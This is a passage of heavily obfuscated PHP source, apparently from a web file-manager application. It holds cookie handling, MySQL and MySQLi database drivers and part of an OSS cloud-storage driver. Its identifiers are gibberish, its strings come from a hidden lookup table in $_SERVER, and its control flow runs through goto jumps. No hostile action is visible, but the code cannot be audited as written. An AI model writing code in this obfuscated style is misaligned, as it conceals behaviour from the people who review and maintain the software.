$“Ñ’¤‡õ[$ôÚ®Ç¸[$¡ãÁ‡»â[95]]] = $ôÚ®Ç¸[$¡ãÁ‡»â[369]]; } } $îÓ¦¤Ã = $“Ñ’¤‡õ; } unset($îÓ¦¤Ã); $å¶—·ï = Model($¡ãÁ‡»â[2272]); foreach ($ò´ÌÆ­ as &$Ãïâáöò) { $®¬ŸÒ’ = array(); if (isset($³ŒÅ¨Ï¢[$Ãïâáöò[$¡ãÁ‡»â[1631]]])) { $®¬ŸÒ’ = $³ŒÅ¨Ï¢[$Ãïâáöò[$¡ãÁ‡»â[1631]]]; } $Ãïâáöò[$¡ãÁ‡»â[2273]] = array(); if (isset($®¬ŸÒ’[$ØæØöÔ])) { $Ãïâáöò[$¡ãÁ‡»â[2273]] = $å¶—·ï->getUserJobInfo($®¬ŸÒ’[$ØæØöÔ]); } } unset($Ãïâáöò); } protected function groupUserAll($¤òêï‚‡) { $¨ˆ—Óóˆ =& $_SERVER[ì…™Î¶Ï]; if (!$¤òêï‚‡) { return !1; } $äâÎƒŠş = Model($¨ˆ—Óóˆ[1888])->field($¨ˆ—Óóˆ[1631])->where(array($¨ˆ—Óóˆ[1799] => array($¨ˆ—Óóˆ[7], $¤òêï‚‡)))->select(); $äâÎƒŠş = array_to_keyvalue($äâÎƒŠş, $¨ˆ—Óóˆ[12], $¨ˆ—Óóˆ[1631]); return array_unique($äâÎƒŠş); } public function userSearch($íğÀ‰ªÃ, $Ü¬±ÃË = "\x2a") { return Model($_SERVER[ì…™Î¶Ï][529])->where($íğÀ‰ªÃ)->field($Ü¬±ÃË)->find(); } } goto b§ÁŒ Âñ; AÏêŒ©¨öì: function binCheckBigger($›Èˆ‘äĞ, $ò‚º—üõ) { return $›Èˆ‘äĞ > $ò‚º—üõ; } $_SERVER[$_SERVER[ ¼ÕÆÇ][3]] = ("\x38\x30\x30\x35"."\67\61")+0;$_zvhi="9qkl8x1e03pf5arwhjmi7o2tb6yzcduvg4snxaisvyq5l9ke64h37rojbucpwf8d01tngz2m4ervfo";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ä¥÷Ú½Å, $¡İİÛùõ) { $Ú™‡×ï¾ =& $_SERVER[ì…™Î¶Ï]; if (isset(self::$_methodList[$ä¥÷Ú½Å])) { return @call_user_func_array(self::$_methodList[$ä¥÷Ú½Å], $¡İİÛùõ); } else { if (method_exists($this, $ä¥÷Ú½Å)) { return call_user_func_array(array($this, $ä¥÷Ú½Å), $¡İİÛùõ); } else { think_exception(__CLASS__ . $Ú™‡×ï¾[4] . $ä¥÷Ú½Å . $Ú™‡×ï¾[5]); } } } public static function __callStatic($¹îº²Ï, $‰›ˆæÒé) { if (isset(self::$_methodListStatic[$¹îº²Ï])) { return call_user_func_array(self::$_methodListStatic[$¹îº²Ï], $‰›ˆæÒé); } else { if (method_exists(self, $¹îº²Ï)) { return call_user_func_array(array(self, $¹îº²Ï), $‰›ˆæÒé); } else { show_json("{$¹îº²Ï}\x28\x29\x20\156\157\x74\40\x65\x78\151\163\164\x3b", !1); } } } public static function addMethod($îÁÛú³Õ, $²¯ïø“¬) { self::$_methodList[$îÁÛú³Õ] = $²¯ïø“¬; } public static function addMethodStatic($—™ˆŞ€ô, $´ÅÙ¥·) { self::$_methodListStatic[$—™ˆŞ€ô] = $´ÅÙ¥·; } } goto BĞ±ŒÏ¸³½; FòãÑ¥À²ï: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‹³ì–±Ú = '', $°©—¯Êõ = 0) { if (is_string($‹³ì–±Ú) && $‹³ì–±Ú != $_SERVER[ì…™Î¶Ï][12]) { $this->prefix = $‹³ì–±Ú; } if (is_numeric($°©—¯Êõ) && $°©—¯Êõ > 0) { $this->expire = $°©—¯Êõ; } } public static function getInstance() { static $¬›ˆÏœ¢; if ($¬›ˆÏœ¢ === null) { $¬›ˆÏœ¢ = new self(); } return $¬›ˆÏœ¢; } private static $cookieDisable = false; public static function disable($Í›Ü†µ) { self::$cookieDisable = $Í›Ü†µ; } private static $sameCookieSet = array(); public static function set($óçùÒ¥˜, $ùˆş®ğÒ, $šŠß€­ı = 0, $±˜¨øúÉ = false, $² ÷½õˆ = false) { $ÂêÁ®· =& $_SERVER[ì…™Î¶Ï]; if (self::$cookieDisable) { return; } if (!$šŠß€­ı) { $šŠß€­ı = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$óçùÒ¥˜]) && self::$sameCookieSet[$óçùÒ¥˜] == $ùˆş®ğÒ . $šŠß€­ı) { return; } self::$sameCookieSet[$óçùÒ¥˜] = $ùˆş®ğÒ . $šŠß€­ı; if (!$² ÷½õˆ) { $² ÷½õˆ = str_replace(HOST, $ÂêÁ®·[12], APP_HOST); $² ÷½õˆ = _get($GLOBALS, $ÂêÁ®·[858], $² ÷½õˆ); } $·î°ş« = $ÂêÁ®·[12]; setcookie($óçùÒ¥˜, $ùˆş®ğÒ, time() + $šŠß€­ı, $ÂêÁ®·[8] . trim($² ÷½õˆ, $ÂêÁ®·[8]) . $·î°ş«, !1, !1, $±˜¨øúÉ); } public static function setSafe($°³‚åŸ“, $‘¢Úõéñ, $ßØœ‰˜ = 0) { self::set($°³‚åŸ“, $‘¢Úõéñ, $ßØœ‰˜, !0); } public static function get($¼ò‚÷ñÜ) { static $‰ˆØÑú = false; if (!$‰ˆØÑú) { self::initHeaderCookie(); $‰ˆØÑú = !0; } return isset($_COOKIE[$¼ò‚÷ñÜ]) ? $_COOKIE[$¼ò‚÷ñÜ] : !1; } private static function initHeaderCookie() { $„ßñª¥İ =& $_SERVER[ì…™Î¶Ï]; if (!isset($_SERVER[$„ßñª¥İ[859]]) || !$_SERVER[$„ßñª¥İ[859]]) { return; } $¡¸…şöÜ = explode($„ßñª¥İ[71], $_SERVER[$„ßñª¥İ[859]]); foreach ($¡¸…şöÜ as $ÙäØó) { $ÙäØó = explode($„ßñª¥İ[860], $ÙäØó); if (count($ÙäØó) != 2 || !isset($ÙäØó[1])) { continue; } $_COOKIE[trim($ÙäØó[0])] = trim($ÙäØó[1]); } } public static function remove($òü°¢’, $ÀàÈÈúí = false) { unset($_COOKIE[$òü°¢’]); self::set($òü°¢’, $_SERVER[ì…™Î¶Ï][12], 1, $ÀàÈÈúí); } } class DbMysql extends Db { public function __construct($—ÒÈàş = '') { $‡ƒÒè…Ş =& $_SERVER[ì…™Î¶Ï]; if (!extension_loaded($‡ƒÒè…Ş[779])) { think_exception(think_lang($‡ƒÒè…Ş[14]) . $‡ƒÒè…Ş[861]); } if (!empty($—ÒÈàş)) { $this->config = $—ÒÈàş; if (empty($this->config[$‡ƒÒè…Ş[17]])) { $this->config[$‡ƒÒè…Ş[17]] = $‡ƒÒè…Ş[12]; } } } public function connect($ğ‚ºğÀŠ = '', $ıâÊ«á½ = 0, $ˆ‡õ¿ş = false) { $îöç¥ì£ =& $_SERVER[ì…™Î¶Ï]; if (!isset($this->linkID[$ıâÊ«á½])) { if (empty($ğ‚ºğÀŠ)) { $ğ‚ºğÀŠ = $this->config; } $ïşû¡ƒ° = $ğ‚ºğÀŠ[$îöç¥ì£[862]] . ($ğ‚ºğÀŠ[$îöç¥ì£[863]] ? "\72{$ğ‚ºğÀŠ[$îöç¥ì£[863]]}" : $îöç¥ì£[12]); $â©…Ê = !empty($ğ‚ºğÀŠ[$îöç¥ì£[17]][$îöç¥ì£[18]]) ? $ğ‚ºğÀŠ[$îöç¥ì£[17]][$îöç¥ì£[18]] : $this->pconnect; if ($â©…Ê) { $this->linkID[$ıâÊ«á½] = mysql_pconnect($ïşû¡ƒ°, $ğ‚ºğÀŠ[$îöç¥ì£[864]], $ğ‚ºğÀŠ[$îöç¥ì£[865]], 131072); } else { $this->linkID[$ıâÊ«á½] = mysql_connect($ïşû¡ƒ°, $ğ‚ºğÀŠ[$îöç¥ì£[864]], $ğ‚ºğÀŠ[$îöç¥ì£[865]], !0, 131072); } if (!$this->linkID[$ıâÊ«á½] || !empty($ğ‚ºğÀŠ[$îöç¥ì£[21]]) && !mysql_select_db($ğ‚ºğÀŠ[$îöç¥ì£[21]], $this->linkID[$ıâÊ«á½])) { think_exception(mysql_error()); } $›Ç°ª½„ = mysql_get_server_info($this->linkID[$ıâÊ«á½]); mysql_query($îöç¥ì£[866] . think_config($îöç¥ì£[867]) . $îöç¥ì£[58], $this->linkID[$ıâÊ«á½]); if ($›Ç°ª½„ > $îöç¥ì£[868]) { mysql_query($îöç¥ì£[869], $this->linkID[$ıâÊ«á½]); } $this->connected = !0; if (1 != think_config($îöç¥ì£[22])) { unset($this->config); } } return $this->linkID[$ıâÊ«á½]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($«Âáò²°) { $Ñ‡ õê =& $_SERVER[ì…™Î¶Ï]; if (0 === stripos($«Âáò²°, $Ñ‡ õê[259])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«Âáò²°; if ($this->queryID) { $this->free(); } think_action_status($Ñ‡ õê[23], 1); think_status($Ñ‡ õê[24]); $this->queryID = mysql_query($«Âáò²°, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($–Ù‡×î) { $†¬áêÍØ =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $–Ù‡×î; if ($this->queryID) { $this->free(); } think_action_status($†¬áêÍØ[25], 1); think_status($†¬áêÍØ[24]); $èğô¿Áå = mysql_query($–Ù‡×î, $this->_linkID); $this->debug(); if (!1 === $èğô¿Áå) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ì…™Î¶Ï][870], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ş®¶ÊëÔ = mysql_query($_SERVER[ì…™Î¶Ï][871], $this->_linkID); $this->transTimes = 0; if (!$ş®¶ÊëÔ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ìÓîõ” = mysql_query($_SERVER[ì…™Î¶Ï][872], $this->_linkID); $this->transTimes = 0; if (!$ìÓîõ”) { $this->error(); return !1; } } return !0; } private function getAll() { $ê•Ãú¾ş = array(); if ($this->numRows > 0) { while ($®ø¼†’Ú = mysql_fetch_assoc($this->queryID)) { $ê•Ãú¾ş[] = $®ø¼†’Ú; } mysql_data_seek($this->queryID, 0); } return $ê•Ãú¾ş; } public function getFields($–‰ë°÷Ş) { $”×Ú‡ç =& $_SERVER[ì…™Î¶Ï]; $»Ù•Ìòñ = $this->query($”×Ú‡ç[873] . $this->parseKey($–‰ë°÷Ş)); $•÷İûÓ‡ = array(); if ($»Ù•Ìòñ) { foreach ($»Ù•Ìòñ as $Œüê‰ø => $ğî¼ªÊİ) { $•÷İûÓ‡[$ğî¼ªÊİ[$”×Ú‡ç[31]]] = array($”×Ú‡ç[32] => $ğî¼ªÊİ[$”×Ú‡ç[31]], $”×Ú‡ç[33] => $ğî¼ªÊİ[$”×Ú‡ç[34]], $”×Ú‡ç[35] => (bool) (strtoupper($ğî¼ªÊİ[$”×Ú‡ç[36]]) === $”×Ú‡ç[874]), $”×Ú‡ç[37] => $ğî¼ªÊİ[$”×Ú‡ç[38]], $”×Ú‡ç[39] => strtolower($ğî¼ªÊİ[$”×Ú‡ç[40]]) == $”×Ú‡ç[41], $”×Ú‡ç[42] => strtolower($ğî¼ªÊİ[$”×Ú‡ç[43]]) == $”×Ú‡ç[44]); } } return $•÷İûÓ‡; } public function getTables($¨ õ¨Ù = '') { $ÑãĞ…Š„ =& $_SERVER[ì…™Î¶Ï]; if (!empty($¨ õ¨Ù)) { $Ã£Ê‚›õ = $ÑãĞ…Š„[875] . $¨ õ¨Ù . $ÑãĞ…Š„[876]; } else { $Ã£Ê‚›õ = $ÑãĞ…Š„[877]; } $ä©Öñ²ª = $this->query($Ã£Ê‚›õ); $óªĞ…¹ = array(); foreach ($ä©Öñ²ª as $ôµ¦ö“‹ => $˜öÛ¡”ñ) { $óªĞ…¹[$ôµ¦ö“‹] = current($˜öÛ¡”ñ); } return $óªĞ…¹; } public function replace($–ª­Õ“ò, $¬€ã÷ÎĞ = array()) { $øíÅéºÏ =& $_SERVER[ì…™Î¶Ï]; foreach ($–ª­Õ“ò as $åç¹íŞ½ => $îäĞ‚¦û) { $¥É²ò„Õ = $this->parseValue($îäĞ‚¦û); if (is_scalar($¥É²ò„Õ)) { $ÅÛ¶’îå[] = $¥É²ò„Õ; $—ã±œš–[] = $this->parseKey($åç¹íŞ½); } } $Ôà¥Áùâ = $øíÅéºÏ[878] . $this->parseTable($¬€ã÷ÎĞ[$øíÅéºÏ[274]]) . $øíÅéºÏ[879] . implode($øíÅéºÏ[50], $—ã±œš–) . $øíÅéºÏ[880] . implode($øíÅéºÏ[50], $ÅÛ¶’îå) . $øíÅéºÏ[881]; return $this->execute($Ôà¥Áùâ); } public function insertAll($«ãµ”èê, $àóôà­ = array(), $¼…Úß§¯ = false) { $’ŠÃ”ä« =& $_SERVER[ì…™Î¶Ï]; if (!is_array($«ãµ”èê[0])) { return !1; } $ºÉŞ™†„ = array_keys($«ãµ”èê[0]); $ô¿ÅÖŠà = array(); foreach ($«ãµ”èê as $ùåß×°) { $î§ú¥ıá = array(); foreach ($ùåß×° as $ë¹ŠÌÕñ => $”¿Ñçè®) { $”¿Ñçè® = $this->parseValue($”¿Ñçè®); if (is_scalar($”¿Ñçè®)) { $î§ú¥ıá[] = $”¿Ñçè®; } } $ô¿ÅÖŠà[] = $’ŠÃ”ä«[255] . implode($’ŠÃ”ä«[50], $î§ú¥ıá) . $’ŠÃ”ä«[881]; } array_walk($ºÉŞ™†„, array($this, $’ŠÃ”ä«[882])); $ÅÉîÉûÆ = ($¼…Úß§¯ ? $’ŠÃ”ä«[883] : $’ŠÃ”ä«[884]) . $’ŠÃ”ä«[885] . $this->parseTable($àóôà­[$’ŠÃ”ä«[274]]) . $’ŠÃ”ä«[879] . implode($’ŠÃ”ä«[50], $ºÉŞ™†„) . $’ŠÃ”ä«[886] . implode($’ŠÃ”ä«[50], $ô¿ÅÖŠà); return $this->execute($ÅÉîÉûÆ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $çß¼õ =& $_SERVER[ì…™Î¶Ï]; $this->error = mysql_errno() . $çß¼õ[4] . mysql_error($this->_linkID); if ($çß¼õ[12] != $this->queryStr) { $this->error .= LNG($çß¼õ[48]) . $this->queryStr; } think_trace($this->error, $çß¼õ[12], $çß¼õ[49]); return $this->error; } public function escapeString($È¥áêø°) { if ($this->_linkID) { return mysql_real_escape_string($È¥áêø°, $this->_linkID); } else { return mysql_escape_string($È¥áêø°); } } public function parseKey(&$’Ä·ºÁ–, $ĞêøªŠ = true) { $ õ²éÁ´ =& $_SERVER[ì…™Î¶Ï]; if ($ĞêøªŠ) { $’Ä·ºÁ– = $this->parseKeyCheck($’Ä·ºÁ–); } if ($’Ä·ºÁ– != $ õ²éÁ´[181] && !preg_match($ õ²éÁ´[887], $’Ä·ºÁ–)) { $’Ä·ºÁ– = $ õ²éÁ´[380] . trim($’Ä·ºÁ–, $ õ²éÁ´[380]) . $ õ²éÁ´[380]; } return $’Ä·ºÁ–; } } class DbMysqli extends Db { public function __construct($áÃÚã¸µ = '') { $¤±î”¤í =& $_SERVER[ì…™Î¶Ï]; if (!extension_loaded($¤±î”¤í[888])) { think_exception(think_lang($¤±î”¤í[14]) . $¤±î”¤í[889]); } if (!empty($áÃÚã¸µ)) { $this->config = $áÃÚã¸µ; if (empty($this->config[$¤±î”¤í[17]])) { $this->config[$¤±î”¤í[17]] = $¤±î”¤í[12]; } } } public function connect($Š¯›Öàï = '', $õ‚íˆˆ¾ = 0) { $ÎâÍìËı =& $_SERVER[ì…™Î¶Ï]; if (!isset($this->linkID[$õ‚íˆˆ¾])) { if (empty($Š¯›Öàï)) { $Š¯›Öàï = $this->config; } $this->linkID[$õ‚íˆˆ¾] = new mysqli($Š¯›Öàï[$ÎâÍìËı[862]], $Š¯›Öàï[$ÎâÍìËı[864]], $Š¯›Öàï[$ÎâÍìËı[865]], $Š¯›Öàï[$ÎâÍìËı[21]], $Š¯›Öàï[$ÎâÍìËı[863]] ? intval($Š¯›Öàï[$ÎâÍìËı[863]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $„Ìø¤‚Í = $this->linkID[$õ‚íˆˆ¾]->server_version; $this->linkID[$õ‚íˆˆ¾]->query($ÎâÍìËı[866] . think_config($ÎâÍìËı[867]) . $ÎâÍìËı[58]); if ($„Ìø¤‚Í > $ÎâÍìËı[868]) { $this->linkID[$õ‚íˆˆ¾]->query($ÎâÍìËı[869]); } $this->connected = !0; if (1 != think_config($ÎâÍìËı[22])) { unset($this->config); } } return $this->linkID[$õ‚íˆˆ¾]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($‘­ÌŠ®İ) { $Œº…™Åê =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‘­ÌŠ®İ; if ($this->queryID) { $this->free(); } think_action_status($Œº…™Åê[23], 1); think_status($Œº…™Åê[24]); $this->queryID = $this->_linkID->query($‘­ÌŠ®İ); if ($this->_linkID->more_results()) { while (($Üƒ–Œºâ = $this->_linkID->next_result()) != NULL) { $Üƒ–Œºâ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($—ØË‘’Û) { $Ô»–ª“Û =& $_SERVER[ì…™Î¶Ï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $—ØË‘’Û; if ($this->queryID) { $this->free(); } think_action_status($Ô»–ª“Û[25], 1); think_status($Ô»–ª“Û[24]); $õòöÚÚş = $this->_linkID->query($—ØË‘’Û); $this->debug(); if (!1 === $õòöÚÚş) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ï€Íé’Û = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ï€Íé’Û) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹ã³§ó¼ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¹ã³§ó¼) { $this->error(); return !1; } } return !0; } private function getAll() { $‚ƒªŒëŠ = array(); if ($this->numRows > 0) { for ($“å‹–– = 0; $“å‹–– < $this->numRows; $“å‹––++) { $‚ƒªŒëŠ[$“å‹––] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‚ƒªŒëŠ; } public function getFields($ùÑø€¸È) { $¢¼Å²Ü• =& $_SERVER[ì…™Î¶Ï]; $ìşˆºÖ = $this->query($¢¼Å²Ü•[873] . $this->parseKey($ùÑø€¸È)); $œ»Ú¾œ = array(); if ($ìşˆºÖ) { foreach ($ìşˆºÖ as $éà­¯í‹ => $÷Õ¸²ş…) { $œ»Ú¾œ[$÷Õ¸²ş…[$¢¼Å²Ü•[31]]] = array($¢¼Å²Ü•[32] => $÷Õ¸²ş…[$¢¼Å²Ü•[31]], $¢¼Å²Ü•[33] => $÷Õ¸²ş…[$¢¼Å²Ü•[34]], $¢¼Å²Ü•[35] => (bool) ($÷Õ¸²ş…[$¢¼Å²Ü•[36]] === $¢¼Å²Ü•[12]), $¢¼Å²Ü•[37] => $÷Õ¸²ş…[$¢¼Å²Ü•[38]], $¢¼Å²Ü•[39] => strtolower($÷Õ¸²ş…[$¢¼Å²Ü•[40]]) == $¢¼Å²Ü•[41], $¢¼Å²Ü•[42] => strtolower($÷Õ¸²ş…[$¢¼Å²Ü•[43]]) == $¢¼Å²Ü•[44]); } } return $œ»Ú¾œ; } public function getTables($¬”’•ë = '') { $ÔËÆÉò =& $_SERVER[ì…™Î¶Ï]; $¼Õéî” = !empty($¬”’•ë) ? $ÔËÆÉò[875] . $¬”’•ë . $ÔËÆÉò[876] : $ÔËÆÉò[877]; $Å”ìÂ†ó = $this->query($¼Õéî”); $•šúóğ˜ = array(); if ($Å”ìÂ†ó) { foreach ($Å”ìÂ†ó as $÷ğŠæ‰‰ => $Ş—´ºğŞ) { $•šúóğ˜[$÷ğŠæ‰‰] = current($Ş—´ºğŞ); } } return $•šúóğ˜; } public function replace($»¶‹»®Ù, $™¸†¿¢Ú = array()) { $ê£êß =& $_SERVER[ì…™Î¶Ï]; foreach ($»¶‹»®Ù as $åğ²ôî’ => $Üƒ–ú²“) { $®ÓèËñ = $this->parseValue($Üƒ–ú²“); if (is_scalar($®ÓèËñ)) { $ŞÓµİ²[] = $®ÓèËñ; $Á…·ÍÌ[] = $this->parseKey($åğ²ôî’); } } $Õ·áÍşç = $ê£êß[878] . $this->parseTable($™¸†¿¢Ú[$ê£êß[274]]) . $ê£êß[879] . implode($ê£êß[50], $Á…·ÍÌ) . $ê£êß[880] . implode($ê£êß[50], $ŞÓµİ²) . $ê£êß[881]; return $this->execute($Õ·áÍşç); } public function insertAll($æ™ƒİ÷, $ë“òÔá = array(), $…˜™·û² = false) { $›Éç ¼” =& $_SERVER[ì…™Î¶Ï]; if (!is_array($æ™ƒİ÷[0])) { return !1; } $Ë›ïä® = array_keys($æ™ƒİ÷[0]); $˜‰‰è³° = array(); foreach ($æ™ƒİ÷ as $±©íæç) { $Šû¤”ßå = array(); foreach ($±©íæç as $Ë„Ãç®¢ => $Öññ¹ì ) { $Öññ¹ì  = $this->parseValue($Öññ¹ì ); if (is_scalar($Öññ¹ì )) { $Šû¤”ßå[] = $Öññ¹ì ; } } $˜‰‰è³°[] = $›Éç ¼”[255] . implode($›Éç ¼”[50], $Šû¤”ßå) . $›Éç ¼”[881]; } array_walk($Ë›ïä®, array($this, $›Éç ¼”[882])); $üÌøêÆà = $…˜™·û² ? $›Éç ¼”[883] : $›Éç ¼”[884]; $›Î°À³À = $üÌøêÆà . $›Éç ¼”[885] . $this->parseTable($ë“òÔá[$›Éç ¼”[274]]) . $›Éç ¼”[879] . implode($›Éç ¼”[50], $Ë›ïä®) . $›Éç ¼”[886] . implode($›Éç ¼”[50], $˜‰‰è³°); return $this->execute($›Î°À³À); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $é©“Ğ¼È =& $_SERVER[ì…™Î¶Ï]; $this->error = $this->_linkID->errno . $é©“Ğ¼È[4] . $this->_linkID->error; if ($é©“Ğ¼È[12] != $this->queryStr) { $this->error .= LNG($é©“Ğ¼È[48]) . $this->queryStr; } think_trace($this->error, $é©“Ğ¼È[12], $é©“Ğ¼È[49]); return $this->error; } public function escapeString($—ª•Ãµ‰) { if ($this->_linkID) { return $this->_linkID->real_escape_string($—ª•Ãµ‰); } else { return addslashes($—ª•Ãµ‰); } } public function parseKey(&$ôµöÁ¤÷, $®•à¶’® = true) { $úéåÁıÔ =& $_SERVER[ì…™Î¶Ï]; if ($®•à¶’®) { $ôµöÁ¤÷ = $this->parseKeyCheck($ôµöÁ¤÷); } if ($ôµöÁ¤÷ != $úéåÁıÔ[181] && !preg_match($úéåÁıÔ[887], $ôµöÁ¤÷)) { $ôµöÁ¤÷ = $úéåÁıÔ[380] . trim($ôµöÁ¤÷, $úéåÁıÔ[380]) . $úéåÁıÔ[380]; } return $ôµöÁ¤÷; } } goto c—ªÌš©˜á; A ¯«ÖÓ¯‰: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¡²ëÜ·§) { parent::__construct($¡²ëÜ·§); $this->signatureVersion($_SERVER[ì…™Î¶Ï][211]); } public function fileOutLink($¸—ÂÌ–¯) { $°ò¹¾¡ =& $_SERVER[ì…™Î¶Ï]; if (substr($¸—ÂÌ–¯, 0, 7) == $°ò¹¾¡[1299]) { $¸—ÂÌ–¯ = $°ò¹¾¡[1300] . substr($¸—ÂÌ–¯, 7); } header($°ò¹¾¡[158] . $¸—ÂÌ–¯); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($÷¶š™ ú) { parent::__construct(); include_once SDK_DIR . $_SERVER[ì…™Î¶Ï][1359]; $this->_init($÷¶š™ ú); } public function _init($˜ƒØ®˜) { $ëïâ ›° =& $_SERVER[ì…™Î¶Ï]; foreach ($˜ƒØ®˜ as $‹ÕÊ¶Ä => $Èãö›¤ë) { if (isset($this->{$‹ÕÊ¶Ä})) { $this->{$‹ÕÊ¶Ä} = $Èãö›¤ë; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ëïâ ›°[1360] . LNG($ëïâ ›°[1361])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ïë²ñ³™ =& $_SERVER[ì…™Î¶Ï]; $µÄ©™¢ú = new OSS\Model\CorsConfig(); $àä–”æÕ = new OSS\Model\CorsRule(); $àä–”æÕ->addAllowedOrigin($ïë²ñ³™[1362]); $àä–”æÕ->addAllowedMethod($ïë²ñ³™[1363]); $àä–”æÕ->addAllowedMethod($ïë²ñ³™[1364]); $àä–”æÕ->addAllowedMethod($ïë²ñ³™[1365]); $àä–”æÕ->addAllowedMethod($ïë²ñ³™[1366]); $àä–”æÕ->addAllowedMethod($ïë²ñ³™[157]); $àä–”æÕ->setMaxAgeSeconds(600); $àä–”æÕ->addExposeHeader($ïë²ñ³™[1367]); $àä–”æÕ->addAllowedHeader($ïë²ñ³™[1362]); $µÄ©™¢ú->addRule($àä–”æÕ); try { $this->client->putBucketCors($this->bucket, $µÄ©™¢ú); } catch (OSS\Core\OssException $¼Œ“À¿ş) { return !1; } return !0; } public function getBucketCors() { $ƒ£Ğúí– =& $_SERVER[ì…™Î¶Ï]; $¼°ˆõÑ± = null; try { $¼°ˆõÑ± = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ô¿¨ÇŒ©) { return null; } if (!$¼°ˆõÑ± || !($ñ×¸ ç = $¼°ˆõÑ±->getRules())) { return null; } $öß¢Ñ—‚ = $ñ×¸ ç[0]->getAllowedOrigins(); $óÔÀˆ¡ = $ñ×¸ ç[0]->getAllowedMethods(); $–ë–š£› = $ñ×¸ ç[0]->getMaxAgeSeconds(); $ì“êõñ = $ñ×¸ ç[0]->getExposeHeaders(); $ãÀñ„ıŒ = $ñ×¸ ç[0]->getAllowedHeaders(); return array($ƒ£Ğúí–[180] => isset($öß¢Ñ—‚[0]) ? $öß¢Ñ—‚[0] : $ƒ£Ğúí–[12], $ƒ£Ğúí–[184] => $óÔÀˆ¡, $ƒ£Ğúí–[1368] => $–ë–š£›, $ƒ£Ğúí–[1369] => isset($ì“êõñ[0]) ? $ì“êõñ[0] : $ƒ£Ğúí–[12], $ƒ£Ğúí–[182] => isset($ãÀñ„ıŒ[0]) ? $ãÀñ„ıŒ[0] : $ƒ£Ğúí–[12]); } public function isBucketCors() { $Ôé§¦ç =& $_SERVER[ì…™Î¶Ï]; $ı½ë´Îõ = $this->getBucketCors(); if (!$ı½ë´Îõ || !is_array($ı½ë´Îõ)) { return !1; } if ($ı½ë´Îõ[$Ôé§¦ç[180]] != $Ôé§¦ç[181] || $ı½ë´Îõ[$Ôé§¦ç[182]] != $Ôé§¦ç[181]) { return !1; } $°ùİ°ï = array_map($Ôé§¦ç[183], $ı½ë´Îõ[$Ôé§¦ç[184]]); if (!is_array($°ùİ°ï)) { $°ùİ°ï = array(); } $ä›İÄáô = array($Ôé§¦ç[185], $Ôé§¦ç[186], $Ôé§¦ç[187], $Ôé§¦ç[188], $Ôé§¦ç[189]); $ÌÚâÏÃ = array_diff($ä›İÄáô, $°ùİ°ï); return empty($ÌÚâÏÃ); } public function mkfile($ÛÕ¿“‹, $·ÔÈùæï = '', $ïÖ²úœ = REPEAT_RENAME) { $Ñ›¬Š‰ä = $this->setContent($ÛÕ¿“‹, $·ÔÈùæï); if ($Ñ›¬Š‰ä !== !1) { return $this->getPathOuter($ÛÕ¿“‹); } return !1; } public function mkdir($ÄŠéûşæ, $ÓÄïŒÍ† = REPEAT_SKIP) { if ($this->_isFolder($ÄŠéûşæ)) { return $this->getPathOuter($ÄŠéûşæ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÄŠéûşæ)); } catch (OSS\Core\OssException $Ü­³üÆÔ) { return !1; } return $this->getPathOuter($ÄŠéûşæ); } private function fileList($­¢ƒ¸€è, $ÂÖâª¶‡ = '', $àøö«ñ = 0) { $¥ô‚”È– =& $_SERVER[ì…™Î¶Ï]; $­¢ƒ¸€è = trim($­¢ƒ¸€è, $¥ô‚”È–[8]); $ÁßÛÚó = empty($­¢ƒ¸€è) && $­¢ƒ¸€è !== $¥ô‚”È–[190] ? $¥ô‚”È–[12] : $­¢ƒ¸€è . $¥ô‚”È–[8]; $à±µô = $¥ô‚”È–[12]; $Ç£»¤¸ñ = 1000; $†ùÏŞ°ã = $this->listItemCache === !1 ? !1 : !0; $èìé“Å = $º»È¿®Ñ = array(); while (!0) { check_abort(); $Ì÷ÌãÃõ = 